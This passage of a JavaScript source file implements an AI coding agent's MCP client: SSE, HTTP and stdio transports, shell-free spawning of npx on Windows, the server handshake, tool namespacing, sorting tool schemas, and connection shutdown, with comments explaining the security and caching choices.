    },
  };
}

/**
 * ── LEGACY SSE (spec 2024-11-05) ────────────────────────────────────────────
 *
 * Two channels. A long-lived GET carries every server→client message; its first
 * frame, `event: endpoint`, names a SECOND url that client→server POSTs go to.
 * Those POSTs answer `202 Accepted` with an empty body — the actual reply
 * arrives on the GET stream, which is precisely why the correlation has to live
 * in `createRpc` and not in a transport.
 *
 * ⚠️ KEPT, THOUGH IT IS DEPRECATED, BECAUSE IT IS WHAT LOCAL SERVERS SPEAK.
 * Figma's desktop server is `http://127.0.0.1:3845/sse`; several hosted ones
 * still publish an `/sse` url beside their `/mcp` one. Refusing `type:"sse"`
 * would reject the documented config line for a whole class of servers.
 */
function sseTransport({ url, headers, fetchImpl }) {
  const ac = new AbortController();
  let endpoint = null;
  let failed = null;
  let opening = null;
  const waiters = [];

  function settleWaiters() {
    while (waiters.length) {
      const w = waiters.pop();
      if (failed) w.reject(failed); else w.resolve(endpoint);
    }
  }

  function open(deliver) {
    if (opening) return opening;
    opening = (async () => {
      const { res, url: streamUrl } = await fetchSameOrigin(fetchImpl, url, {
        method: 'GET',
        headers: { ...headers, accept: 'text/event-stream' },
        signal: ac.signal,
      });
      if (!res.ok || !res.body) throw new Error(`GET answered ${res.status} — expected an event stream`);
      const parser = createSseParser((frame) => {
        if (frame.event === 'endpoint') {
          // ⚠️ RESOLVED AGAINST THE STREAM URL, not the configured one: servers
          // send a path (`/messages?sessionId=…`), and after a same-origin
          // redirect the base is the url we actually landed on.
          const checked = checkSseEndpoint(frame.data, streamUrl);
          if (checked.ok) endpoint = checked.url;
          else failed = new Error(checked.error);
          settleWaiters();
          return;
        }
        let msg;
        try { msg = JSON.parse(frame.data); } catch { return; }
        for (const m of Array.isArray(msg) ? msg : [msg]) deliver(m);
      });
      /**
       * ⚠️ NOT AWAITED. This stream stays open for the life of the session, so
       * awaiting it here would hang the handshake forever. It is torn down by
       * `close()`, and its failure is recorded for whoever is waiting on the
       * endpoint rather than thrown into nobody's hands.
       */
      pumpSse(res, parser).catch((err) => {
        if (!failed && err?.name !== 'AbortError') failed = err;
        settleWaiters();
      }).then(() => {
        if (!endpoint && !failed) failed = new Error('the event stream closed before naming a POST endpoint');
        settleWaiters();
      });
    })().catch((err) => { failed = err; settleWaiters(); });
    return opening;
  }

  function waitForEndpoint(timeoutMs) {
    if (endpoint) return Promise.resolve(endpoint);
    if (failed) return Promise.reject(failed);
    return new Promise((resolve, reject) => {
      const timer = setTimeout(() => reject(new Error(`the server never sent its "endpoint" event within ${Math.round(timeoutMs / 1000)}s`)), timeoutMs);
      waiters.push({
        resolve: (v) => { clearTimeout(timer); resolve(v); },
        reject: (e) => { clearTimeout(timer); reject(e); },
      });
    });
  }

  return {
    async send(payload, ctx) {
      open(ctx.deliver);
      const target = await waitForEndpoint(ctx?.timeoutMs ?? HANDSHAKE_TIMEOUT_MS);
      const { res } = await fetchSameOrigin(fetchImpl, target, {
        method: 'POST',
        headers: { ...headers, 'content-type': 'application/json' },
        body: JSON.stringify(payload),
        signal: ac.signal,
      });
      if (!res.ok) {
        const body = await res.text().catch(() => '');
        throw new Error(`POST to the message endpoint answered ${res.status}${body ? ` — ${body.slice(0, 200)}` : ''}`);
      }
      // ⭐ Some servers answer the POST with the reply inline instead of 202.
      // Both are allowed; delivering whatever came back costs nothing and
      // `createRpc` ignores an id it is not waiting for.
      const text = await res.text().catch(() => '');
      if (text.trim()) {
        try {
          const msg = JSON.parse(text);
          for (const m of Array.isArray(msg) ? msg : [msg]) ctx.deliver(m);
        } catch { /* 202 bodies are routinely "Accepted" */ }
      }
    },
    close() {
      try { ac.abort(); } catch { /* already */ }
    },
  };
}

/**
 * Start one server and ask what it can do.
 *
 * ⚠️ NEVER THROWS. A broken server in a config must degrade to "that one is
 * unavailable" — the others still work, and the session still runs. A user with
 * five servers should not lose their whole tool surface because one of them has
 * a bad path.
 */
/**
 * ── ⚠️ WINDOWS CANNOT SPAWN `npx` WITHOUT A SHELL, AND MOST SERVERS ARE npx ──
 *
 * `spawn('npx', args, {shell:false})` fails with ENOENT on Windows: npx is
 * `npx.cmd`, and since the BatBadBut fix (CVE-2024-27980) Node refuses to run a
 * `.cmd` without `shell: true`. Measured here — every MCP server configured the
 * normal way (`"command": "npx"`) simply would not start.
 *
 * ⚠️ THE OBVIOUS FIX IS `shell: true` AND IT IS THE WRONG ONE. It would hand a
 * shell a command string assembled from a config file, reintroducing exactly the
 * injection surface `command.mjs` spends four hundred lines removing — on the
 * one path that also carries the user's API tokens in its environment.
 *
 * ⭐ So the executable is RESOLVED to a real file first and spawned by absolute
 * path. Same trick `buildInvocation` uses for npm, generalised: walk PATH with
 * PATHEXT, find what would actually have run, and run that.
 */
function nodeCliEntry(name) {
  /**
   * ⭐ THE ONLY WINDOWS-SAFE WAY TO RUN npm/npx WITHOUT A SHELL, and
   * `command.mjs` already proved it: spawn the real `node` we are running with
   * npm's own JavaScript entry point. No shim, no `.cmd`, no PATH lookup of
   * anything but node itself, identical behaviour on every platform.
   *
   * ⚠️ Resolving to `npx.cmd` and spawning it by absolute path does NOT work —
   * Node rejects it with EINVAL, which is the BatBadBut protection
   * (CVE-2024-27980) doing its job. Measured here, after the PATHEXT fix.
   */
  const dir = dirname(process.execPath);
  const file = name === 'npm' ? 'npm-cli.js' : 'npx-cli.js';
  for (const c of [
    join(dir, 'node_modules', 'npm', 'bin', file),
    join(dir, '..', 'lib', 'node_modules', 'npm', 'bin', file),
    join(dir, '..', 'node_modules', 'npm', 'bin', file),
  ]) {
    if (existsSync(c)) return c;
  }
  return null;
}

function resolveExecutable(command) {
  // An explicit path is used as given.
  if (command.includes('/') || command.includes(String.fromCharCode(92))) return command;
  if (process.platform !== 'win32') return command;

  const exts = (process.env.PATHEXT || '.COM;.EXE;.BAT;.CMD').split(';').filter(Boolean);
  const dirs = (process.env.PATH || '').split(';').filter(Boolean);
  for (const dir of dirs) {
    /**
     * ⚠️ EXTENSIONS FIRST, BARE NAME LAST — and the other order is a real bug I
     * shipped for one commit. `C:\Program Files
odejs\` contains BOTH `npx`
     * (an extensionless bash script, there for Git Bash) and `npx.cmd`. Trying
     * '' first resolved to the bash script, which Windows cannot spawn: still
     * ENOENT, but now from a path that exists, which is much harder to diagnose.
     * cmd.exe consults PATHEXT for exactly this reason.
     */
    for (const ext of [...exts, '']) {
      const candidate = join(dir, command + ext);
      try {
        if (existsSync(candidate) && statSync(candidate).isFile()) return candidate;
      } catch { /* unreadable PATH entry */ }
    }
  }
  // ⚠️ Fall through unchanged rather than inventing a path. The spawn will fail
  // with ENOENT, which is a clearer error than a wrong file that exists.
  return command;
}

/**
 * initialize → initialized → tools/list, for whatever is on the other end.
 *
 * ⭐ ONE COPY. This is the sequence that decides whether a server is usable, the
 * truncation that keeps a 400-tool server from eating the prompt, and the
 * `isError`-free path into `mcpToolSchemas`. A transport-specific second copy is
 * how "it works over stdio" and "it works over HTTP" stop meaning the same
 * thing.
 *
 * ⚠️ NEVER THROWS, same contract as `connectServer`: returns `{ok:false,error}`.
 */
async function performHandshake(rpc, { protocolVersion, diagnose = () => '' }) {
  const init = await rpc.request('initialize', {
    protocolVersion,
    capabilities: {},
    clientInfo: { name: 'acuvo-code', version: '0.2.0' },
  }, HANDSHAKE_TIMEOUT_MS);

  const extra = diagnose();
  if (init?.error || extra) {
    return { ok: false, error: `${init?.error?.message ?? extra}${init?.error && extra ? ` — ${extra}` : ''}` };
  }
  rpc.notify('notifications/initialized', {});

  const listed = await rpc.request('tools/list', {}, HANDSHAKE_TIMEOUT_MS);
  if (listed?.error) return { ok: false, error: listed.error.message };

  const all = listed?.result?.tools ?? [];
  return { ok: true, tools: all.slice(0, MAX_TOOLS_PER_SERVER), truncated: all.length > MAX_TOOLS_PER_SERVER };
}

/**
 * Connect to a server declared with a `url` — no process, no environment, no
 * `spawn`.
 *
 * ⚠️ IT DEGRADES EXACTLY LIKE THE STDIO PATH: an unreachable host, a 401, a
 * missing credential variable, a cross-origin redirect — every one of them
 * returns `{ok:false}` and the session continues with the other servers. A
 * hosted server that is down must cost a line in the transcript, not the run.
 */
export async function connectRemoteServer(server, { fetchImpl = fetch, env = process.env } = {}) {
  const resolved = resolveHeaders(server, { env });
  if (!resolved.ok) return { ok: false, name: server.name, error: resolved.error };

  const make = server.transport === 'sse' ? sseTransport : streamableHttpTransport;
  let transport;
  try {
    transport = make({ url: server.url, headers: resolved.headers, fetchImpl });
  } catch (err) {
    return { ok: false, name: server.name, error: `could not open ${server.url}: ${err?.message ?? err}` };
  }

  const rpc = createRpc({ send: transport.send });
  const shook = await performHandshake(rpc, { protocolVersion: HTTP_PROTOCOL_VERSION });
  if (!shook.ok) {
    try { transport.close(); } catch { /* nothing open */ }
    // ⭐ The URL is in the message: with several servers configured, "HTTP 401"
    // alone does not say WHICH remote system rejected the credential.
    return { ok: false, name: server.name, error: `${shook.error} (${server.url})` };
  }
  return {
    ok: true,
    name: server.name,
    url: server.url,
    transport: server.transport,
    child: null,
    close: transport.close,
    rpc,
    tools: shook.tools,
    truncated: shook.truncated,
  };
}

export async function connectServer(server, { root, spawnImpl = spawn, fetchImpl = fetch, env = process.env } = {}) {
  /**
   * ⚠️ THE BRANCH IS ON `transport`, NEVER ON "does it have a command" —
   * `readMcpConfig` sets `command` to the URL for a remote server so the
   * `mcp-start` notice and the consent fingerprint name the destination (see
   * there). A truthiness check on `command` would therefore try to spawn a URL.
   */
  if (server?.transport === 'http' || server?.transport === 'sse') {
    return connectRemoteServer(server, { fetchImpl, env });
  }

  let child;
  try {
    /**
     * ⚠️ npm and npx are routed through node's own entry point (see
     * nodeCliEntry); everything else is resolved on PATH. `--no` is injected
     * for npx so it can only run a package that is ALREADY INSTALLED — without
     * it, npx downloads and executes whatever name it was given, which is
     * remote code execution wearing a config file.
     */
    const bare = server.command;
    const entry = (bare === 'npm' || bare === 'npx') ? nodeCliEntry(bare) : null;
    const file = entry ? process.execPath : resolveExecutable(bare);
    const argv = entry
      ? [entry, ...(bare === 'npx' ? ['--no'] : []), ...server.args.filter((a) => a !== '-y' && a !== '--yes')]
      : server.args;
    child = spawnImpl(file, argv, {
      cwd: root,
      // ⚠️ NOT the scrubbed env used for run_command. An MCP server usually
      // NEEDS a token to be useful, and the user put it in the config
      // deliberately. This is the one place where withholding credentials would
      // break the feature rather than protect it — which is precisely why the
      // server list is user-authored and never model-authored.
      env: { ...process.env, ...server.env },
      stdio: ['pipe', 'pipe', 'pipe'],
      shell: false,
    });
  } catch (err) {
    return { ok: false, name: server.name, error: `could not start: ${err?.message ?? err}` };
  }

  /**
   * ⚠️ A FAILED SPAWN LEAVES `stdout` NULL, and `createRpc` then throws on
   * `.setEncoding` — which killed the process with NO OUTPUT AT ALL. That is
   * how the first real test of this file appeared to "hang": it had already
   * crashed, silently, before any error could be reported.
   */
  if (!child?.stdout || !child?.stdin) {
    return { ok: false, name: server.name, error: `could not start "${server.command}" (no stdio — is it installed and on PATH?)` };
  }

  /**
   * ⚠️ An MCP server must not decide when acuvo exits. Servers are spawned per
   * turn, so without this every turn that used one leaves a reason to stay
   * alive — see lib/child-lifetime.mjs.
   */
  detachChild(child);

  // A server that dies on startup must not leave the session waiting.
  let died = null;
  child.on('error', (e) => { died = e?.message ?? String(e); });
  child.stderr?.setEncoding('utf8');
  let stderrTail = '';
  child.stderr?.on('data', (d) => { stderrTail = (stderrTail + d).slice(-500); });

  const transport = stdioTransport(child);
  const rpc = createRpc({ send: transport.send });
  const shook = await performHandshake(rpc, {
    protocolVersion: STDIO_PROTOCOL_VERSION,
    // ⭐ stderr is included: an MCP server's real complaint ("missing API key")
    // arrives there, never in the RPC error, and without it the user gets
    // "initialize failed" and no idea why. Read through a callback because it is
    // only populated by the time the handshake has finished waiting.
    diagnose: () => (died ? `${died}${stderrTail ? ` — ${stderrTail.trim().slice(0, 200)}` : ''}` : ''),
  });
  if (!shook.ok) {
    try { child.kill(); } catch { /* already gone */ }
    const tail = !died && stderrTail ? ` — ${stderrTail.trim().slice(0, 200)}` : '';
    return { ok: false, name: server.name, error: `${shook.error}${tail}` };
  }

  return {
    ok: true,
    name: server.name,
    transport: 'stdio',
    child,
    close: transport.close,
    rpc,
    tools: shook.tools,
    truncated: shook.truncated,
  };
}

/**
 * ⚠️ THE NAMESPACE IS A SAFETY PROPERTY, NOT TIDINESS. A server offering its own
 * `write_file` must not shadow ours, and the transcript must always show which
 * one ran. Double underscore because a single one is common inside tool names.
 */
export function namespacedName(server, tool) {
  return `mcp__${server}__${tool}`;
}

export function parseNamespaced(name) {
  const m = /^mcp__([a-z0-9_-]+)__(.+)$/i.exec(name ?? '');
  return m ? { server: m[1], tool: m[2] } : null;
}

/**
 * Turn a server's advertised tools into schemas the model can be offered.
 *
 * ── ⭐⭐ SORTED, BECAUSE THIS IS THE ONE PART OF THE PREFIX A STRANGER OWNS ──
 *
 * ⚠️ THE ORDER USED TO BE THE REMOTE SERVER'S CHOICE. Tools were appended in
 * whatever order `tools/list` returned, and servers were iterated in
 * `.mcp.json` insertion order. Within a single session that is stable — the
 * connection is made once — but a CONTINUING session (`--resume`, interactive
 * chat) reconnects and re-lists on every turn, so a server that builds its list
 * from an unordered map (a Go map, or any language whose dicts are not
 * insertion-ordered) reorders OUR tools array between turns.
 *
 * ⚠️⚠️ AND THE TOOLS ARRAY SITS AHEAD OF THE MESSAGES IN THE CACHED PREFIX, so
 * that is not a small loss at the end: it is 100% of the prompt, invisibly,
 * decided by a third party. `skills.mjs` already sorts its catalogue for exactly
 * this reason and says so ("so the catalogue — and therefore the cacheable
 * prefix — is the same string on every run"); MCP never inherited the rule.
 *
 * ⚠️ SORTED BY THE NAMESPACED NAME, WHICH ALSO FIXES THE SERVER ORDER. The
 * `mcp__<server>__<tool>` prefix means one sort settles both the tool order
 * within a server and the order of the servers themselves — including the
 * `Object.entries` quirk that floats integer-like server names to the front.
 *
 * ⚠️ `byCodePoint`, NOT `localeCompare` — the comparator must not depend on the
 * machine's ICU, or a fleet diverges at byte 0. See `prefix-order.mjs`.
 */
export function mcpToolSchemas(connections) {
  const out = [];
  for (const c of connections) {
    if (!c.ok) continue;
    for (const t of c.tools) {
      if (!t?.name) continue;
      out.push({
        type: 'function',
        function: {
          name: namespacedName(c.name, t.name),
          // ⭐ The server's own description, prefixed with where it came from.
          // A model choosing between two similar tools needs to know which
          // system it is about to touch.
          description: `[${c.name}] ${t.description ?? 'no description provided'}`.slice(0, 900),
          parameters: t.inputSchema && typeof t.inputSchema === 'object'
            ? t.inputSchema
            : { type: 'object', properties: {} },
        },
      });
    }
  }
  // ⭐ The one line that takes the prefix back off the remote party.
  out.sort((a, b) => byCodePoint(a.function.name, b.function.name));
  return out;
}

/** Call a namespaced tool on whichever server owns it. */
export async function callMcpTool(connections, name, args) {
  const parsed = parseNamespaced(name);
  if (!parsed) return { ok: false, error: `"${name}" is not an MCP tool id` };
  const conn = connections.find((c) => c.ok && c.name === parsed.server);
  if (!conn) return { ok: false, error: `the "${parsed.server}" server is not connected` };

  const res = await conn.rpc.request('tools/call', { name: parsed.tool, arguments: args ?? {} }, CALL_TIMEOUT_MS);
  if (res?.error) return { ok: false, error: `${parsed.server}: ${res.error.message}` };

  const content = res?.result?.content ?? [];
  const text = content
    .map((c) => (c?.type === 'text' ? c.text : `[${c?.type ?? 'unknown'}]`))
    .join('\n')
    .slice(0, 20_000);
  /**
   * ⚠️ `isError` IS THE SERVER SAYING THE TOOL FAILED, on a successful RPC.
   * Treating it as success would hand the model a failure message formatted as
   * a result and let it build on top of it — the same silent-success class that
   * made the sandbox verifier useless this morning.
   */
  if (res?.result?.isError) return { ok: false, error: text || 'the tool reported an error' };
  return { ok: true, server: parsed.server, tool: parsed.tool, text };
}

/**
 * Shut every server down. Called when the session ends, always.
 *
 * ⚠️ `close()` FIRST, `child.kill()` AS THE FALLBACK. A remote connection has no
 * child to kill, and the old `if (!c.child) continue` skipped it entirely — an
 * open SSE stream is a live socket, and a live socket keeps Node's event loop
 * alive, so a session with one hosted server would have printed its report and
 * then never exited. That is the same failure `child-lifetime.mjs` documents for
 * children, arriving over TCP where `unref` does not reach.
 */
export function closeConnections(connections) {
  for (const c of connections) {
    if (!c.ok) continue;
    try { c.close?.(); } catch { /* already gone */ }
    if (!c.child) continue;
    try { c.child.kill(); } catch { /* already gone */ }
  }
}
